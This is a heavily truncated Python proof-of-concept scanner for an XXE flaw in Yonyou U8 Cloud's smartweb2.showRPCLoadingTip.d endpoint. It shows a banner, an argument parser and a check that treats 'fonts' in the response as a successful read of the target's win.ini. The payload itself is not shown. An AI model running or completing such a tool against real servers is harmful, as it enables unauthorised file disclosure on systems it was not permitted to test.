...
#app="用友-U8-Cloud" YYU8Cloud_smartweb2.XXE.py
# 导包
 ...
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                    ...
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞
"""
    print(banner)
# 主函数模块
def main():
    ...
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a 用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞")
...
def poc(target):
    ...
    try:
        ...
        if res.status_code == 200 and 'fonts' in res.text:#读取 win.ini 配置文件
